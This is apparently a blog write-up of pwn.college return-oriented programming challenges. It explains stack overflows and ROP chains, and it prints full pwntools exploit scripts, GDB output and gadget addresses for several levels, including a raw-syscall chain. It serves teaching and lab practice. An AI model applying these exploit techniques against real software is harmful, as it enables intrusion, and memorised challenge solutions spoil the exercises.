---
title: "Return-Oriented Programming Demystified"
categories: [Binary, Exploitation]
tags: [linux, pwn, rop]
---

In the world of binary exploitation, one technique stands out for its cleverness and power: **Return-Oriented Programming (ROP)**. If you've been learning exploit development, you've likely heard of it—and if you're taking on challenges from [pwn.college](https://pwn.college/program-security/return-oriented-programming/), you're getting a hands-on taste of just how effective (and fun!) ROP can be.

In this blog post, I’ll walk through what ROP is, why it’s used, and share my journey solving the ROP challenges on pwn.college.


## What is Return-Oriented Programming?

Return-Oriented Programming is a technique that allows an attacker to execute code in the presence of security mechanisms like **non-executable stack (NX)**. When you can't inject and run your own code directly, ROP allows you to repurpose snippets of existing code in the binary—called **gadgets**—to perform arbitrary computation.

A typical gadget ends in a `ret` instruction and performs a small task, such as popping a register or performing arithmetic. By chaining gadgets together via the stack, attackers can build “programs” out of these existing instructions.



## Why Use ROP?

ROP is used in modern exploitation scenarios where:

- **The stack is non-executable** (no shellcode allowed).
- **Control of the instruction pointer (RIP)** is possible (e.g., via buffer overflow).
- You need **fine-grained control** over registers and memory without injecting full code.


With ROP, you can build payloads that:

- Call `execve("/bin/sh", ...)` to spawn a shell.    
- Bypass `ASLR` using known offsets.
- Leak memory or manipulate arbitrary values.


### Challenge Setup

Each challenge gives you a vulnerable binary with ASLR/NX enabled and a remote server to exploit. I used:

- **pwntools** for scripting
- **Ghidra** for reversing
- **ropper** to find gadgets
- **GDB + pwndbg** for live debugging

The following picture illustrates our ROP-chain:

![rop](https://devel0pment.de/wp-content/uploads/2018/02/rop-768x576.png)


[Source](https://devel0pment.de/?p=366)

Before running pwn.college challenges they need `libcapstone5`

You can install it -

```bash
git clone https://github.com/capstone-engine/capstone.git
cd capstone
git checkout 5.0.1
make
sudo make install
```

## Level 1.0 `babyrop_level1.0`

Overwrite a return address to trigger a win function!

In an early challenge, you're given a buffer overflow where the goal is to call a function like `win()`.

I decided to `scp` the binary `/challenge/babyrop_level1.0` into my local system. Then exploit it and then push the exploit after testing locally.

```bash
scp -i pwncollege_key hacker@pwn.college:/challenge/babyrop_level1.0 .
```

When we run the provided binary, it gives us a helpful message:

> _The saved return address is stored at `0x7fff98a800c8`, 72 bytes after the start of your input buffer._

This tells us that we need to **send 72 bytes** of input before we can overwrite the **saved return address** on the stack.

To confirm this, we can send a payload like:

```python
b"A" * 72 + b"B" * 8
```

This will:

- Fill the buffer with `A`s
- Overwrite the return address with `BBBBBBBB` (which is `0x4242424242424242` in little-endian)

```txt
...
 RBP  0x4141414141414141 ('AAAAAAAA')
 RSP  0x7ffedf5e7b58 ◂— 'BBBBBBBB\n'
 RIP  0x401dda (challenge+488) ◂— ret 
─────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────
 ► 0x401dda <challenge+488>    ret                                <0x4242424242424242>
    ↓

```

As expected, **we've overwritten the return address** with `0x4242424242424242`.

Now that we control the return address, we can simply redirect execution to the `win()` function.

To better understand how our payload maps onto the stack, here’s a visual representation of the stack frame during exploitation. Remember, the stack grows from **higher to lower addresses**, so the return address is at the top. Our goal is to overwrite this return address with the address of the `win()` function:

```txt
+--------------------------------------------+
| Stack Frame (Higher Address at Top ↑)      |
|                                            |
| 0x7fff98a800c8                             |
| Return Address                             |
| → win()                                    |
|--------------------------------------------|
| 0x7fff98a800c0                             |
| Saved RBP → 'A'*8                          |
|--------------------------------------------|
| 0x7fff98a80078                             |
| Padding → 'A'*64                           |
|--------------------------------------------|
| 0x7fff98a80000                             |
| Input Buffer Start                         |
+--------------------------------------------+

```

Here’s the full exploit script using **pwntools**:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or '/challenge/babyrop_level1.0')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

# Offset to return address
offset = 72

io = start()
payload = b'A'*offset
payload += pack(exe.sym['win'])
io.recvuntil(b'address).')
io.sendline(payload)
io.recvuntil(b'flag:\n')
flag = io.recvline()
log.success(f"{flag.decode()}")

#io.interactive()
io.close()
```

This is a textbook example of a **ret2func** (return-to-function) exploit — the foundation of Return-Oriented Programming (ROP)!


## Level 2.0

Use ROP to trigger a two-stage win function!

In this level, we're required to use ROP to trigger **two separate functions** in sequence:

- `win_stage_1`
- `win_stage_2`

Both functions are defined in the binary, and we must craft our payload to call **`win_stage_1()` first**, and then **`win_stage_2()`**.

On running the provided binary, it gives us a useful hint:

> _"You can call a function by overflowing directly into the saved return address, which is stored at `0x7ffff71390e8`, 88 bytes after the start of your input buffer."_

This means we can overflow the stack buffer and overwrite the saved return address (`RIP`) directly. We're told the offset to RIP is **88 bytes**, so our payload needs to be:

```python
"A"*88 + "B"*8
```

Let’s analyze this with GDB. After supplying the above input, here’s what we observe:

```txt
...
 RBP  0x4141414141414141 ('AAAAAAAA')
 RSP  0x7fffffffe2f8 ◂— 0x4242424242424242 ('BBBBBBBB')
 RIP  0x4023e9 (challenge+464) ◂— ret 
─────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────
 ► 0x4023e9 <challenge+464>    ret                                <0x4242424242424242>

```

We have successfully:

- Overflowed `RBP` with `"A" * 8`
- Overwritten `RIP` with `"B" * 8` (`0x4242424242424242`)

**Recap: x86_64 Calling Convention**

Before building our ROP chain, let’s quickly revisit the **x86_64 System V ABI** calling convention:

- Arguments to functions are passed in registers in this order:

```txt
RDI, RSI, RDX, RCX, R8, R9
```
- The return address is stored on the stack after the saved `RBP`.
- Function calls use the `call` instruction, which pushes the return address and jumps to the function.

ROP takes advantage of this by replacing the return address with the address of a gadget (or function), causing execution to jump there when the function returns.

Since the binary is likely compiled without stack canaries, PIE, or other protections, we can stack multiple return addresses and chain function calls.

**Basic ROP Chain Structure**

```txt
payload  = b"A" * 88          # Overflow buffer to reach saved RIP
payload += p64(win_stage_1)   # Address of first function
payload += p64(win_stage_1)   # Address of second function
```

Each `ret` will pop the next value from the stack into `RIP`, effectively "returning" into the next function.

Here’s the full exploit script using **pwntools**:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or '/challenge/babyrop_level2.0')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

offset = 88

io = start()

payload = b'A'*offset	# Overflow buffer to reach saved RIP
payload += pack(exe.sym['win_stage_1']) # Address of first function
payload += pack(exe.sym['win_stage_2']) # Address of second function

io.recvuntil(b'address).\n')
io.sendline(payload)
flag = io.recvall()
log.success(f"{flag.decode()}")

#io.interactive()
io.close()
```


## Level 3.0

Use ROP to trigger a multi-stage win function!

In this level, we're introduced to multi-stage function chaining using Return-Oriented Programming (ROP). The goal is simple: **call a series of "win" functions** in the correct order using stack control.

We are given the addresses of 5 different win functions inside the binary:

```txt
0x0000000000402453  win_stage_2
0x0000000000402533  win_stage_5
0x0000000000402616  win_stage_4
0x00000000004026fc  win_stage_1
0x00000000004027d8  win_stage_3
```

Each of these functions must be executed **in order**, one after the other. Since the binary is vulnerable to a stack buffer overflow, we’ll exploit that to build a ROP chain that sequentially calls all 5 functions.

In addition to calling each function in the right order, you must also pass an argument to each of them! The argument you pass will be the stage number. For instance, `win_stage_1(1)`.

```c
win_stage_1(1)
win_stage_2(2)
win_stage_3(3)
win_stage_4(4)
win_stage_5(5)
```

To pass arguments in x86_64 System V ABI:

- The **first argument** is passed in the **`RDI`** register.
- So, before calling `win_stage_1`, we need to load `1` into `RDI`.

To control `RDI`, we need a gadget that pops a value into `RDI`. This is commonly found in binaries and looks like:

```c
pop rdi
ret
```

```bash
$ ropper --file babyrop_level3.0 --search 'pop rdi; ret'
[INFO] File: babyrop_level3.0
0x0000000000402bc3: pop rdi; ret;
```

We’ve already determined that the **offset to the return address (RIP)** is **104 bytes**. This means we need to overflow the input buffer with 104 bytes of padding before we can start overwriting the saved `RIP`.

Here’s what the beginning of the payload looks like:

```python
payload = b'A'*104
payload += p64(pop_rdi)
payload += p64(0x1)
payload += p64(win_stage_1)
#...
```

Each stage follows this same format:

1. `pop rdi; ret` — load the argument (stage number) into `RDI`    
2. `win_stage_X` — call the corresponding function

### ❗ Note:

I won’t be showing the **full exploit here**, as that would defeat the purpose of the challenge — and it would be **cheating**. ;)



## Level 4.0

Leverage a stack leak while crafting a ROP chain to obtain the flag!


In this level, we’ll use a **stack leak** to craft a more advanced ROP chain. This level is about handling **stack-based data** carefully while executing a ROP payload.

When you run the challenge binary, it helpfully prints the address of your input buffer on the stack:

```txt
[LEAK] Your input buffer is located at: 0x7ffc38b42fc0
```

The binary reads your input, overflows the stack, and allows you to perform a **ROP attack**. This time, **ASLR is enabled**, but the binary simulates a **memory disclosure** — leaking the address of the input buffer on the stack.

Let's find out the offset to overwrite **EIP**. I passed `cyclic(100)` characters.

```bash
 RBP  0x616161616161616b ('kaaaaaaa')
 RSP  0x7fffffffe2f8 ◂— 0x616161616161616c ('laaaaaaa')
 RIP  0x402168 (challenge+396) ◂— ret
#...
pwndbg> cyclic -l 0x616161616161616b
Finding cyclic pattern of 8 bytes: b'kaaaaaaa' (hex: 0x6b61616161616161)
Found at offset 80
```

The offset to overwrite **RBP** is **80**.

Since the binary does not provide a `win()`-style helper function, we must craft a full ROP chain that directly performs the desired actions (e.g., opening, reading, and printing the flag) by invoking raw syscalls.

Let’s try to call `exit(4)` manually via a raw syscall. Since there's no helper or wrapper function, we’ll construct the ROP chain ourselves.

```python
payload = b'A' * offset                     # Fill buffer to return address
payload += p64(pop_rax) + p64(60)           # rax = 60 (SYS_exit)
payload += p64(pop_rdi) + p64(4)            # rdi = 4 (exit code)
payload += p64(syscall)                     # trigger syscall
```

The program should cleanly terminate with exit code `4`.

Use the following script -

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'babyrop_level4.0')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

offset = 88 

pop_rax = 0x401fad # 0x401fad: pop rax; ret; 
pop_rdi = 0x401fd5 # 0x401fd5: pop rdi; ret;
pop_rsi = 0x401fcd # 0x401fcd: pop rsi; ret;
pop_rdx = 0x401fa5 # 0x401fa5: pop rdx; ret;
syscall = 0x401fb5 # 0x401fb5: syscall;

payload = b'A' * offset                     # Fill buffer to return address
payload += p64(pop_rax) + p64(60)           # rax = 60 (SYS_exit)
payload += p64(pop_rdi) + p64(4)            # rdi = 4 (exit code)
payload += p64(syscall)                     # trigger syscall

io.sendline(payload)
io.interactive()

```

We're running the binary under GDB using:

```bash
$ python level4.py GDB
#...
# In GDB window
pwndbg> c
Continuing.
[Inferior 1 (process 55051) exited with code 04]
pwndbg> 

```

Success — we’ve just demonstrated a clean syscall to `exit(4)`! This confirms that we have full control over registers and can safely issue raw syscalls from our ROP chain.

With this in place, we’re now ready to call more complex syscalls like:

```c
execve("/bin/cat", ["/bin/cat", "/flag", NULL], NULL);
```

Of course I won’t spoil the full exploit — but here’s a small glimpse of how we use a syscall like `write()` in our ROP chain. With minor tweaks, the same technique applies to `execve()` or other syscalls:

```python
payload = b'A' * offset
payload += p64(pop_rax) + p64(1)        # write syscall number
payload += p64(pop_rdi) + p64(1)        # stdout
payload += p64(pop_rsi) + p64(buf_addr) # buffer containing data
payload += p64(pop_rdx) + p64(10)       # number of bytes to write
payload += p64(syscall)
```

Well, you filled the start of your buffer with `'A' * offset`. So when `rsi = buf_addr`, and you request `write(1, buf_addr, 10)`, you’re printing the first **10 `'A'` characters** from the stack.

```bash
Leaving!
AAAAAAAAAA[*] Got EOF while reading in interactive

```

With this, you’ve successfully learned how to invoke **Linux syscalls using ROP**

All the best for the rest of the challenge — and happy pwning!
